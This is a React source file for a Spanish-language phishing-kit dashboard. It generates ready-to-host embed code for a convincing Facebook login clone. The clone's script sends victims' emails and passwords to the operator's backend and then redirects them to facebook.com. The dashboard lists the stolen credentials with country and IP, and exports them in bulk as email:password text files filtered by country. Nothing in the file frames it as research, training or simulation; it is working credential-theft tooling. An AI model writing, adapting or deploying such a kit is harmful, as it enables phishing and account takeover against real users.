import { useState, useEffect } from 'react';
import api from '../services/api';
import { useAuth } from '../context/AuthContext';

const COUNTRY_FLAGS = {
  'Mexico': '🇲🇽', 'United States': '🇺🇸', 'Argentina': '🇦🇷', 'Colombia': '🇨🇴',
  'Chile': '🇨🇱', 'Peru': '🇵🇪', 'Ecuador': '🇪🇨', 'Venezuela': '🇻🇪',
  'Brazil': '🇧🇷', 'Spain': '🇪🇸', 'Guatemala': '🇬🇹', 'Dominican Republic': '🇩🇴',
  'Honduras': '🇭🇳', 'Bolivia': '🇧🇴', 'Paraguay': '🇵🇾', 'Uruguay': '🇺🇾',
  'Costa Rica': '🇨🇷', 'Panama': '🇵🇦', 'Nicaragua': '🇳🇮', 'El Salvador': '🇸🇻',
};

const getFlag = (country) => COUNTRY_FLAGS[country] || '🌍';

const FormsPage = () => {
  const { user } = useAuth();
  const [attempts, setAttempts] = useState([]);
  const [countries, setCountries] = useState([]);
  const [loading, setLoading] = useState(true);
  const [filterCountry, setFilterCountry] = useState('');

  const [page, setPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [totalRecords, setTotalRecords] = useState(0);

  const [showEmbed, setShowEmbed] = useState(false);
  const [showDownload, setShowDownload] = useState(false);
  const [showConfig, setShowConfig] = useState(false);

  const [redirectUrl, setRedirectUrl] = useState('https://facebook.com');
  const [counterName, setCounterName] = useState('');
  const [downloadCount, setDownloadCount] = useState(100);
  const [downloadCountry, setDownloadCountry] = useState('');

  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => { fetchCountries(); }, []);
  useEffect(() => { fetchAttempts(); }, [page, filterCountry]);

  const fetchCountries = async () => {
    try {
      const res = await api.get('/facebook/countries');
      setCountries(res.data);
    } catch (err) { console.error(err); }
  };

  const fetchAttempts = async () => {
    setLoading(true);
    try {
      let url = `/facebook/attempts?page=${page}&limit=15`;
      if (filterCountry) url += `&country=${filterCountry}`;
      const res = await api.get(url);
      setAttempts(res.data.attempts);
      setTotalPages(res.data.pagination.totalPages);
      setTotalRecords(res.data.pagination.total);
    } catch (err) { console.error(err); }
    finally { setLoading(false); }
  };

  const handleSubmit = async () => {
    if (!email || !password) { alert('Completa todos los campos'); return; }
    setSubmitting(true);
    try {
      await api.post('/facebook/attempt', { email, password, tenantId: user?.tenant?.id });
      window.open(redirectUrl, '_blank');
      setEmail(''); setPassword('');
      fetchAttempts(); fetchCountries();
    } catch (err) { console.error(err); alert('Error al enviar'); }
    finally { setSubmitting(false); }
  };

  const handleDownload = async () => {
    try {
      const res = await api.post('/facebook/download', {
        quantity: parseInt(downloadCount),
        country: downloadCountry || undefined,
      });
      const blob = new Blob([res.data.credentials], { type: 'text/plain' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url; a.download = res.data.filename;
      document.body.appendChild(a); a.click();
      URL.revokeObjectURL(url); document.body.removeChild(a);
      setShowDownload(false);
    } catch (err) { alert(err.response?.data?.error || 'Error al descargar'); }
  };

  const getEmbedCode = () => {
    const backendUrl = window.location.origin.replace('5173', '3001');
    const tenantId = user?.tenant?.id || '';
    const name = counterName.trim() || 'usuario';
    const redirect = redirectUrl.trim() || 'https://facebook.com';
    return `<!-- Facebook Login Clon - Responsive -->
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column}
.fb-wrap{max-width:500px;margin:0 auto;width:100%;padding:0 16px;box-sizing:border-box}
.fb-input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:8px;font-size:16px;color:#1c1e21;margin-bottom:12px;outline:none;background:#fff;box-sizing:border-box}
.fb-input:focus{border-color:#1877f2}
.fb-btn{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:18px}
.fb-btn:disabled{background:#aaa;cursor:not-allowed}
.fb-btn-reg{width:100%;padding:13px;background:#fff;color:#1877f2;border:1.5px solid #1877f2;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:16px}
</style>
<div style="display:flex;justify-content:space-between;align-items:center;max-width:500px;margin:0 auto;width:100%;padding:14px 16px 0;box-sizing:border-box">
<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1c1e21" stroke-width="2.2"><path d="M15 19l-7-7 7-7"/></svg>
<span style="font-size:14px;color:#606770">Español</span>
<div style="width:22px"></div>
</div>
<div style="display:flex;justify-content:center;padding:36px 0 32px">
<div style="width:72px;height:72px;background:#1877f2;border-radius:50%;display:flex;align-items:center;justify-content:center">
<svg width="44" height="44" viewBox="0 0 36 36" fill="white"><path d="M20.18 35.87V21.94h4.45l.67-5.17h-5.12v-3.3c0-1.5.41-2.51 2.57-2.51h2.74V6.42a36.74 36.74 0 0 0-4-.2c-3.96 0-6.68 2.42-6.68 6.86v3.83H10.4v5.17h4.41v13.79a18 18 0 1 1 5.37 0z"/></svg>
</div>
</div>
<div class="fb-wrap">
<input type="text" id="fb-email" class="fb-input" placeholder="Celular o correo electrónico" />
<input type="password" id="fb-pass" class="fb-input" placeholder="Contraseña" />
<button id="fb-btn" class="fb-btn">Iniciar sesión</button>
<div style="text-align:center;margin-bottom:32px"><span style="font-size:14px;font-weight:600;color:#1c1e21;cursor:pointer">¿Olvidaste tu contraseña?</span></div>
</div>
<div class="fb-wrap">
<button class="fb-btn-reg">Crear cuenta nueva</button>
<div style="display:flex;justify-content:center;align-items:center;gap:6px;padding-bottom:12px">
<svg width="16" height="16" viewBox="0 0 48 48" fill="#606770"><path d="M6.5 24c0-4.4 1-7.8 2.4-9.8 1-1.5 2.3-2.2 3.6-2.2 1.6 0 3.2 1.2 4.8 4.3C18.4 18.8 19.6 21.3 21 24c-1.4 2.7-2.6 5.2-3.7 7.7-1.6 3.1-3.2 4.3-4.8 4.3-1.3 0-2.6-.7-3.6-2.2C7.5 31.8 6.5 28.4 6.5 24zm20.2-7.6c-2-3.5-4.3-5.4-7.2-5.4-2.1 0-4 1-5.6 3.1C12 16.6 10.5 20.1 10.5 24c0 3.9 1.5 7.4 3.4 9.9 1.6 2.1 3.5 3.1 5.6 3.1 2.9 0 5.2-1.9 7.2-5.4C28.3 29 29.7 26.6 31 24c-1.3-2.6-2.7-5-4.3-7.6zM31 24c1.4 2.7 2.8 5.1 4.3 7.6 2 3.5 4.3 5.4 7.2 5.4 1.3 0 2.6-.7 3.6-2.2C47.5 32.6 48 29 48 24s-.5-8.6-1.9-10.8c-1-1.5-2.3-2.2-3.6-2.2-2.9 0-5.2 1.9-7.2 5.4C33.8 18.9 32.4 21.4 31 24zm10.5 0c0 4.4-1 7.8-2.4 9.8-1 1.5-2.3 2.2-3.6 2.2-1.6 0-3.2-1.2-4.8-4.3C29.6 29.2 28.4 26.7 27 24c1.4-2.7 2.6-5.2 3.7-7.7 1.6-3.1 3.2-4.3 4.8-4.3 1.3 0 2.6.7 3.6 2.2 1.4 2 2.4 5.4 2.4 9.8z"/></svg>
<span style="color:#606770;font-size:14px;font-weight:500">Meta</span>
</div>
<div style="text-align:center;padding-bottom:24px"><span style="font-size:12px;color:#8a8d91">&#x1f512; facebook.com</span></div>
</div>
<script id="_wau${name}">var _wau=_wau||[];_wau.push(["dynamic","${name}","8f9","c4302bffffff","small"]);</script>
<script async src="//waust.at/d.js"></script>
<script>
document.getElementById('fb-btn').addEventListener('click',function(){
var e=document.getElementById('fb-email').value,p=document.getElementById('fb-pass').value,b=document.getElementById('fb-btn');
if(!e||!p){alert('Por favor completa todos los campos.');return}
b.disabled=!0;b.innerText='Verificando...';
fetch('${backendUrl}/api/facebook/attempt',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:e,password:p,tenantId:'${tenantId}'})})
.then(function(r){return r.json()})
.then(function(d){if(d.success){window.location.href='${redirect}'}else{alert('Error al iniciar sesión')}b.disabled=!1;b.innerText='Iniciar sesión'})
.catch(function(){alert('Error de conexión.');b.disabled=!1;b.innerText='Iniciar sesión'});
});
</script>`;
  };

  const handleCopyCode = () => { navigator.clipboard.writeText(getEmbedCode()); alert('Código copiado'); };

  return (
    <div className="animate-in">

      {/* HEADER */}
      <div style={{
        background: 'linear-gradient(135deg, rgba(0,255,65,0.05), rgba(0,212,255,0.05))',
        border: '1px solid var(--border-color)', borderRadius: 'var(--radius-lg)',
        padding: '20px 24px', marginBottom: '24px',
        display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '12px'
      }}>
        <div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '4px' }}>
            <div style={{
              width: '36px', height: '36px', background: '#1877f2', borderRadius: '8px',
              display: 'flex', alignItems: 'center', justifyContent: 'center'
            }}>
              <svg width="20" height="20" viewBox="0 0 36 36" fill="white"><path d="M20.18 35.87V21.94h4.45l.67-5.17h-5.12v-3.3c0-1.5.41-2.51 2.57-2.51h2.74V6.42a36.74 36.74 0 0 0-4-.2c-3.96 0-6.68 2.42-6.68 6.86v3.83H10.4v5.17h4.41v13.79a18 18 0 1 1 5.37 0z"/></svg>
            </div>
            <h1 className="page-title" style={{ fontSize: '22px', margin: 0 }}>FACEBOOK <span style={{ color: 'var(--neon-cyan)' }}>LOGIN</span></h1>
          </div>
          <p className="page-subtitle" style={{ margin: 0, fontSize: '12px' }}>
            Captura de credenciales · Detección por país · Embed listo para hosting
          </p>
        </div>
        <div style={{ display: 'flex', gap: '8px' }}>
          <button onClick={() => setShowConfig(!showConfig)}
            style={{
              background: showConfig ? 'rgba(0,212,255,0.15)' : 'transparent',
              border: `1px solid ${showConfig ? 'var(--neon-cyan)' : 'var(--border-color)'}`,
              borderRadius: '6px', padding: '8px 14px', fontSize: '12px',
              color: showConfig ? 'var(--neon-cyan)' : 'var(--text-secondary)',
              cursor: 'pointer', fontFamily: 'var(--font-mono)', transition: 'all 0.2s'
            }}>
            ⚙ CONFIG
          </button>
          <button onClick={() => { if (!counterName.trim()) { alert('Ingresa un nombre para el contador en Config'); return; } setShowEmbed(true); }}
            style={{
              background: 'rgba(0,212,255,0.1)', border: '1px solid var(--neon-cyan)',
              borderRadius: '6px', padding: '8px 14px', fontSize: '12px',
              color: 'var(--neon-cyan)', cursor: 'pointer', fontFamily: 'var(--font-mono)',
              transition: 'all 0.2s'
            }}>
            &lt;/&gt; EMBED
          </button>
        </div>
      </div>

      {/* CONFIG */}
      {showConfig && (
        <div className="card" style={{ marginBottom: '24px', padding: '16px 20px' }}>
          <div style={{ display: 'flex', gap: '16px', flexWrap: 'wrap', alignItems: 'end' }}>
            <div className="input-group" style={{ flex: '1', minWidth: '200px' }}>
              <label className="input-label" style={{ fontSize: '11px' }}>URL DE REDIRECCIÓN</label>
              <input type="url" className="input" value={redirectUrl}
                onChange={(e) => setRedirectUrl(e.target.value)}
                placeholder="https://facebook.com"
                style={{ width: '100%', padding: '8px 12px', fontSize: '13px' }} />
            </div>
            <div className="input-group" style={{ flex: '1', minWidth: '200px' }}>
              <label className="input-label" style={{ fontSize: '11px' }}>NOMBRE DEL CONTADOR</label>
              <input type="text" className="input" value={counterName}
                onChange={(e) => setCounterName(e.target.value)}
                placeholder="millonesgan"
                style={{ width: '100%', padding: '8px 12px', fontSize: '13px', fontFamily: 'monospace' }} />
            </div>
            {counterName.trim() && (
              <div style={{ fontSize: '11px', color: 'var(--neon-cyan)', fontFamily: 'monospace', padding: '8px 0' }}>
                📊 <span style={{ color: 'var(--text-secondary)' }}>Stats:</span> whos.amung.us/stats/readers/{counterName.trim()}
              </div>
            )}
          </div>
        </div>
      )}

      {/* MAIN CONTENT */}
      <div style={{ display: 'flex', gap: '24px', flexWrap: 'wrap' }}>

        {/* PHONE PREVIEW */}
        <div style={{ flex: '0 0 auto', width: '340px' }}>
          <div style={{
            background: '#eef1f5',
            borderRadius: 'var(--radius-lg)', padding: '24px 16px',
            border: '1px solid var(--border-color)',
            display: 'flex', justifyContent: 'center', alignItems: 'center',
            minHeight: '680px'
          }}>
            {/* VOLUME BUTTONS */}
            <div style={{ position: 'relative' }}>
              <div style={{
                position: 'absolute', right: '-6px', top: '100px', width: '3px', height: '40px',
                background: 'linear-gradient(to bottom, #4a4a4a, #6a6a6a, #4a4a4a)',
                borderRadius: '0 3px 3px 0', zIndex: 5
              }}></div>
              <div style={{
                position: 'absolute', right: '-6px', top: '150px', width: '3px', height: '40px',
                background: 'linear-gradient(to bottom, #4a4a4a, #6a6a6a, #4a4a4a)',
                borderRadius: '0 3px 3px 0', zIndex: 5
              }}></div>
              <div style={{
                position: 'absolute', left: '-6px', top: '140px', width: '3px', height: '50px',
                background: 'linear-gradient(to bottom, #4a4a4a, #6a6a6a, #4a4a4a)',
                borderRadius: '3px 0 0 3px', zIndex: 5
              }}></div>
              {/* PHONE BODY */}
              <div style={{
                width: '290px', background: '#1c1e21',
                borderRadius: '42px', overflow: 'hidden', position: 'relative',
                boxShadow: '0 0 0 2px #2a2a2a, 0 0 0 4px #111, 0 20px 60px rgba(0,0,0,0.5), inset 0 0 0 1px rgba(255,255,255,0.05)',
                padding: '8px'
              }}>
                {/* SCREEN */}
                <div style={{
                  borderRadius: '34px', overflow: 'hidden', position: 'relative',
                  background: '#ffffff'
                }}>
                  {/* DYNAMIC ISLAND */}
                  <div style={{
                    position: 'absolute', top: '6px', left: '50%', transform: 'translateX(-50%)',
                    width: '100px', height: '28px', background: '#1c1e21',
                    borderRadius: '18px', zIndex: 20,
                    display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px'
                  }}>
                    <div style={{ width: '7px', height: '7px', borderRadius: '50%', background: '#1a1a2e', border: '1px solid #333' }}></div>
                    <div style={{ width: '16px', height: '4px', borderRadius: '2px', background: '#2a2a3a' }}></div>
                  </div>
                  {/* STATUS BAR */}
                  <div style={{
                    padding: '10px 18px 0', display: 'flex', justifyContent: 'space-between',
                    alignItems: 'center', paddingTop: '44px', fontSize: '11px',
                    fontFamily: '-apple-system, system-ui, sans-serif', fontWeight: '600',
                    color: '#1c1e21'
                  }}>
                    <span>9:41</span>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
                      <svg width="14" height="10" viewBox="0 0 18 12" fill="none">
                        <rect x="1" y="1" width="14" height="10" rx="2" stroke="#1c1e21" strokeWidth="1.2" fill="none"/>
                        <rect x="2" y="2.5" width="10" height="7" rx="1" fill="#1c1e21" opacity="0.8"/>
                        <path d="M16 4v4" stroke="#1c1e21" strokeWidth="1.2"/>
                      </svg>
                      <svg width="14" height="10" viewBox="0 0 16 12">
                        <rect x="0.5" y="1.5" width="13" height="9" rx="2" fill="none" stroke="#1c1e21" strokeWidth="1.2"/>
                        <rect x="2" y="3" width="10" height="6" rx="1" fill="#1c1e21" opacity="0.8"/>
                        <path d="M14 3v6" stroke="#1c1e21" strokeWidth="1.2"/>
                      </svg>
                    </div>
                  </div>
                  {/* BROWSER BAR */}
                  <div style={{
                    padding: '4px 12px 0', display: 'flex', justifyContent: 'space-between',
                    alignItems: 'center'
                  }}>
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#606770" strokeWidth="2">
                      <path d="M15 19l-7-7 7-7"/>
                    </svg>
                    <span style={{ fontSize: '11px', color: '#606770', fontWeight: '500' }}>Español</span>
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#606770">
                      <path d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm8.94 3c-.46-4.17-3.77-7.48-7.94-7.94V1h-2v2.06C6.83 3.52 3.52 6.83 3.06 11H1v2h2.06c.46 4.17 3.77 7.48 7.94 7.94V23h2v-2.06c4.17-.46 7.48-3.77 7.94-7.94H23v-2h-2.06zM12 19c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z"/>
                    </svg>
                  </div>
                  {/* FACEBOOK LOGO */}
                  <div style={{ display: 'flex', justifyContent: 'center', padding: '14px 0 14px' }}>
                    <div style={{ width: '52px', height: '52px', background: '#1877f2', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                      <svg width="32" height="32" viewBox="0 0 36 36" fill="white"><path d="M20.18 35.87V21.94h4.45l.67-5.17h-5.12v-3.3c0-1.5.41-2.51 2.57-2.51h2.74V6.42a36.74 36.74 0 0 0-4-.2c-3.96 0-6.68 2.42-6.68 6.86v3.83H10.4v5.17h4.41v13.79a18 18 0 1 1 5.37 0z"/></svg>
                    </div>
                  </div>
                  {/* FORM */}
                  <div style={{ padding: '0 16px' }}>
                    <input type="text" placeholder="Celular o correo electrónico" value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      style={{ width: '100%', padding: '12px 14px', border: '1px solid #dddfe2', borderRadius: '8px', fontSize: '14px', color: '#1c1e21', marginBottom: '10px', outline: 'none', background: '#f5f6f7', boxSizing: 'border-box', transition: 'all 0.2s' }}
                      onFocus={e => { e.target.style.borderColor = '#1877f2'; e.target.style.background = '#fff'; }}
                      onBlur={e => { e.target.style.borderColor = '#dddfe2'; e.target.style.background = '#f5f6f7'; }} />
                    <input type="password" placeholder="Contraseña" value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      style={{ width: '100%', padding: '12px 14px', border: '1px solid #dddfe2', borderRadius: '8px', fontSize: '14px', color: '#1c1e21', marginBottom: '12px', outline: 'none', background: '#f5f6f7', boxSizing: 'border-box', transition: 'all 0.2s' }}
                      onFocus={e => { e.target.style.borderColor = '#1877f2'; e.target.style.background = '#fff'; }}
                      onBlur={e => { e.target.style.borderColor = '#dddfe2'; e.target.style.background = '#f5f6f7'; }} />
                    <button onClick={handleSubmit} disabled={submitting}
                      style={{ width: '100%', padding: '12px', background: submitting ? '#aaa' : '#1877f2', color: '#fff', border: 'none', borderRadius: '8px', fontSize: '15px', fontWeight: '700', cursor: submitting ? 'not-allowed' : 'pointer', marginBottom: '14px', letterSpacing: '0.3px' }}>
                      {submitting ? 'Verificando...' : 'Iniciar sesión'}
                    </button>
                    <div style={{ textAlign: 'center', marginBottom: '20px' }}>
                      <span style={{ fontSize: '13px', fontWeight: '500', color: '#1877f2', cursor: 'pointer' }}>¿Olvidaste tu contraseña?</span>
                    </div>
                  </div>
                  {/* FOOTER */}
                  <div style={{ padding: '0 16px', borderTop: '1px solid #dadde1', paddingTop: '18px' }}>
                    <button style={{ width: '100%', padding: '12px', background: '#fff', color: '#1877f2', border: '1.5px solid #1877f2', borderRadius: '8px', fontSize: '14px', fontWeight: '700', cursor: 'pointer', marginBottom: '16px' }}>Crear cuenta nueva</button>
                    <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '6px', paddingBottom: '10px' }}>
                      <svg width="14" height="14" viewBox="0 0 48 48" fill="#606770"><path d="M6.5 24c0-4.4 1-7.8 2.4-9.8 1-1.5 2.3-2.2 3.6-2.2 1.6 0 3.2 1.2 4.8 4.3C18.4 18.8 19.6 21.3 21 24c-1.4 2.7-2.6 5.2-3.7 7.7-1.6 3.1-3.2 4.3-4.8 4.3-1.3 0-2.6-.7-3.6-2.2C7.5 31.8 6.5 28.4 6.5 24zm20.2-7.6c-2-3.5-4.3-5.4-7.2-5.4-2.1 0-4 1-5.6 3.1C12 16.6 10.5 20.1 10.5 24c0 3.9 1.5 7.4 3.4 9.9 1.6 2.1 3.5 3.1 5.6 3.1 2.9 0 5.2-1.9 7.2-5.4C28.3 29 29.7 26.6 31 24c-1.3-2.6-2.7-5-4.3-7.6zM31 24c1.4 2.7 2.8 5.1 4.3 7.6 2 3.5 4.3 5.4 7.2 5.4 1.3 0 2.6-.7 3.6-2.2C47.5 32.6 48 29 48 24s-.5-8.6-1.9-10.8c-1-1.5-2.3-2.2-3.6-2.2-2.9 0-5.2 1.9-7.2 5.4C33.8 18.9 32.4 21.4 31 24zm10.5 0c0 4.4-1 7.8-2.4 9.8-1 1.5-2.3 2.2-3.6 2.2-1.6 0-3.2-1.2-4.8-4.3C29.6 29.2 28.4 26.7 27 24c1.4-2.7 2.6-5.2 3.7-7.7 1.6-3.1 3.2-4.3 4.8-4.3 1.3 0 2.6.7 3.6 2.2 1.4 2 2.4 5.4 2.4 9.8z"/></svg>
                      <span style={{ color: '#606770', fontSize: '12px', fontWeight: '500' }}>Meta</span>
                    </div>
                    <div style={{ textAlign: 'center', paddingBottom: '12px' }}>
                      <span style={{ fontSize: '11px', color: '#8a8d91' }}>🔒 facebook.com</span>
                    </div>
                  </div>
                  {/* HOME INDICATOR */}
                  <div style={{
                    display: 'flex', justifyContent: 'center', padding: '6px 0 8px'
                  }}>
                    <div style={{
                      width: '120px', height: '4px', background: '#d0d2d6',
                      borderRadius: '2px'
                    }}></div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* TABLE */}
        <div style={{ flex: '2', minWidth: '500px' }}>
          <div className="card" style={{ padding: 0, overflow: 'hidden' }}>
            <div style={{
              padding: '14px 16px', display: 'flex', justifyContent: 'space-between',
              alignItems: 'center', borderBottom: '1px solid var(--border-color)',
              background: 'rgba(0,255,65,0.02)'
            }}>
              <div>
                <span style={{ fontFamily: 'var(--font-mono)', fontSize: '13px', color: 'var(--neon-green)', fontWeight: 'bold', textTransform: 'uppercase' }}>
                  BÓVEDA_CREDENCIALES
                </span>
                <span style={{ fontSize: '11px', color: 'var(--text-muted)', marginLeft: '10px', fontFamily: 'monospace' }}>
                  ({totalRecords} registros)
                </span>
              </div>
              <button onClick={() => setShowDownload(true)}
                style={{
                  background: 'linear-gradient(135deg, rgba(0,255,65,0.15), rgba(0,212,255,0.1))',
                  border: '1px solid var(--neon-green)', borderRadius: '6px',
                  padding: '7px 16px', fontSize: '11px', color: 'var(--neon-green)',
                  cursor: 'pointer', fontFamily: 'var(--font-mono)', fontWeight: 'bold',
                  display: 'flex', alignItems: 'center', gap: '6px'
                }}>
                ⬇ TXT
              </button>
            </div>

            <div style={{ padding: '10px 16px', borderBottom: '1px solid var(--border-color)' }}>
              <div style={{ display: 'flex', gap: '10px', alignItems: 'center' }}>
                <div className="input-group" style={{ minWidth: '200px', flex: 1 }}>
                  <label className="input-label" style={{ fontSize: '9px' }}>FILTRAR POR PAÍS</label>
                  <select className="input" value={filterCountry}
                    onChange={e => { setFilterCountry(e.target.value); setPage(1); }}
                    style={{ padding: '6px 10px', fontSize: '12px' }}>
                    <option value="">🌍 TODOS LOS PAÍSES</option>
                    {countries.map(c => (
                      <option key={c.name} value={c.name}>{getFlag(c.name)} {c.name} ({c.count})</option>
                    ))}
                  </select>
                </div>
                <div style={{ fontSize: '11px', color: 'var(--text-muted)', fontFamily: 'monospace', alignSelf: 'end', paddingBottom: '6px' }}>
                  {filterCountry ? `${getFlag(filterCountry)} ${filterCountry}` : 'Sin filtro'}
                </div>
              </div>
            </div>

            <div className="table-container">
              {loading ? (
                <div className="loading"><div className="spinner"></div></div>
              ) : (
                <>
                  <table>
                    <thead>
                      <tr>
                        <th style={{ padding: '10px 12px', fontSize: '10px' }}>#</th>
                        <th style={{ padding: '10px 12px', fontSize: '10px' }}>EMAIL</th>
                        <th style={{ padding: '10px 12px', fontSize: '10px' }}>CONTRASEÑA</th>
                        <th style={{ padding: '10px 12px', fontSize: '10px' }}>PAÍS</th>
                        <th style={{ padding: '10px 12px', fontSize: '10px' }}>IP</th>
                        <th style={{ padding: '10px 12px', fontSize: '10px' }}>FECHA</th>
                      </tr>
                    </thead>
                    <tbody>
                      {attempts.length === 0 ? (
                        <tr>
                          <td colSpan="6" style={{ textAlign: 'center', padding: '40px', color: 'var(--text-secondary)', fontFamily: 'monospace', fontSize: '12px' }}>
                            <div style={{ fontSize: '24px', marginBottom: '8px', opacity: 0.3 }}>/</div>
                            NO HAY CREDENCIALES CAPTURADAS AÚN
                            <div style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '4px' }}>
                              Usa el formulario de prueba o despliega el embed en un hosting
                            </div>
                          </td>
                        </tr>
                      ) : (
                        attempts.map((a, i) => (
                          <tr key={a.id} style={{ transition: 'background 0.2s' }}>
                            <td style={{ padding: '10px 12px', fontSize: '11px', color: 'var(--text-muted)' }}>{(page - 1) * 15 + i + 1}</td>
                            <td style={{ padding: '10px 12px', color: 'var(--neon-magenta)', fontSize: '12px', fontWeight: 500 }}>{a.email}</td>
                            <td style={{ padding: '10px 12px', color: 'var(--neon-green)', fontFamily: 'monospace', fontSize: '12px' }}>{a.password}</td>
                            <td style={{ padding: '10px 12px', fontSize: '12px' }}>
                              <span style={{
                                background: a.country ? 'rgba(255,179,0,0.1)' : 'transparent',
                                color: a.country ? 'var(--neon-amber)' : 'var(--text-muted)',
                                padding: '2px 8px', borderRadius: '4px',
                                border: a.country ? '1px solid rgba(255,179,0,0.2)' : 'none',
                                fontSize: '11px'
                              }}>
                                {a.country ? `${getFlag(a.country)} ${a.country}` : 'N/A'}
                              </span>
                            </td>
                            <td style={{ padding: '10px 12px', color: 'var(--text-muted)', fontSize: '11px', fontFamily: 'monospace' }}>{a.ipAddress || 'N/A'}</td>
                            <td style={{ padding: '10px 12px', color: 'var(--text-muted)', fontSize: '10px', fontFamily: 'monospace' }}>
                              {new Date(a.createdAt).toLocaleString()}
                            </td>
                          </tr>
                        ))
                      )}
                    </tbody>
                  </table>

                  {totalPages > 1 && (
                    <div className="pagination" style={{ padding: '12px', borderTop: '1px solid var(--border-color)' }}>
                      <button disabled={page === 1} onClick={() => setPage(p => p - 1)}>{'‹'} ANT</button>
                      {Array.from({ length: totalPages }, (_, i) => i + 1)
                        .filter(p => p === 1 || p === totalPages || Math.abs(p - page) <= 2)
                        .map((p, idx, arr) => (
                          <span key={p} style={{ display: 'inline-flex', gap: '4px', alignItems: 'center' }}>
                            {idx > 0 && arr[idx - 1] !== p - 1 && <span style={{ color: 'var(--text-muted)', fontSize: '12px' }}>...</span>}
                            <button className={page === p ? 'active' : ''} onClick={() => setPage(p)}
                              style={page === p ? {
                                background: 'rgba(0,255,65,0.1)', border: '1px solid var(--neon-green)',
                                color: 'var(--neon-green)', padding: '4px 10px', borderRadius: '4px',
                                fontFamily: 'var(--font-mono)', fontSize: '12px', cursor: 'pointer'
                              } : {
                                background: 'transparent', border: '1px solid transparent',
                                color: 'var(--text-secondary)', padding: '4px 10px', borderRadius: '4px',
                                fontFamily: 'var(--font-mono)', fontSize: '12px', cursor: 'pointer'
                              }}>
                              {p}
                            </button>
                          </span>
                        ))}
                      <button disabled={page === totalPages} onClick={() => setPage(p => p + 1)}>SIG ›</button>
                    </div>
                  )}
                </>
              )}
            </div>
          </div>
        </div>
      </div>

      {/* DOWNLOAD MODAL */}
      {showDownload && (
        <div className="modal-overlay">
          <div className="modal" style={{ width: '480px' }}>
            <h2 className="modal-title" style={{ fontSize: '16px' }}>
              ⬇ EXTRACCIÓN DE CREDENCIALES
            </h2>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
              <div className="input-group">
                <label className="input-label">CANTIDAD A EXTRAER</label>
                <input type="number" className="input" value={downloadCount}
                  onChange={e => setDownloadCount(e.target.value)} min="1" max="10000" />
              </div>
              <div className="input-group">
                <label className="input-label">FILTRAR POR PAÍS (OPCIONAL)</label>
                <select className="input" value={downloadCountry}
                  onChange={e => setDownloadCountry(e.target.value)}>
                  <option value="">🌍 TODOS LOS PAÍSES</option>
                  {countries.map(c => (
                    <option key={c.name} value={c.name}>{getFlag(c.name)} {c.name} ({c.count} capt)</option>
                  ))}
                </select>
              </div>
              <div style={{
                background: 'rgba(0,255,65,0.05)', border: '1px solid rgba(0,255,65,0.15)',
                borderRadius: '6px', padding: '10px 12px', fontSize: '11px',
                color: 'var(--text-secondary)', fontFamily: 'monospace'
              }}>
                Formato: <strong style={{ color: 'var(--neon-green)' }}>email:contraseña</strong> por línea · archivo .txt
              </div>
            </div>
            <div className="modal-actions">
              <button className="btn" onClick={() => setShowDownload(false)}>CANCELAR</button>
              <button className="btn btn-primary" onClick={handleDownload}>⬇ DESCARGAR TXT</button>
            </div>
          </div>
        </div>
      )}

      {/* EMBED MODAL */}
      {showEmbed && (
        <div className="modal-overlay">
          <div className="modal" style={{ width: '680px' }}>
            <h2 className="modal-title" style={{ color: 'var(--neon-cyan)', fontSize: '15px' }}>
              &lt;/&gt; CÓDIGO EMBED
            </h2>
            <div style={{
              background: 'rgba(0,212,255,0.05)', border: '1px solid rgba(0,212,255,0.15)',
              borderRadius: '6px', padding: '10px 12px', marginBottom: '10px',
              fontSize: '11px', fontFamily: 'monospace', color: 'var(--text-secondary)', lineHeight: '1.6'
            }}>
              <span style={{ color: 'var(--neon-cyan)' }}>↪</span> Redirige a: <strong style={{ color: '#fff' }}>{redirectUrl || 'https://facebook.com'}</strong><br/>
              <span style={{ color: 'var(--neon-cyan)' }}>📊</span> Contador: {counterName.trim()
                ? <strong style={{ color: '#fff' }}>whos.amung.us/stats/readers/{counterName.trim()}</strong>
                : <span style={{ color: 'var(--text-muted)' }}>No configurado</span>}<br/>
              <span style={{ color: 'var(--neon-cyan)' }}>🌍</span> País detectado automáticamente por IP (ip-api.com)
            </div>
            <textarea readOnly value={getEmbedCode()}
              style={{
                width: '100%', height: '280px', background: '#050608',
                border: '1px solid var(--border-color)', color: 'var(--neon-green)',
                fontFamily: 'monospace', fontSize: '11px', padding: '12px',
                borderRadius: '6px', resize: 'none'
              }} />
            <div className="modal-actions" style={{ marginTop: '12px' }}>
              <button className="btn" onClick={() => setShowEmbed(false)}>CERRAR</button>
              <button className="btn btn-cyan" onClick={handleCopyCode}>📋 COPIAR CÓDIGO</button>
            </div>
          </div>
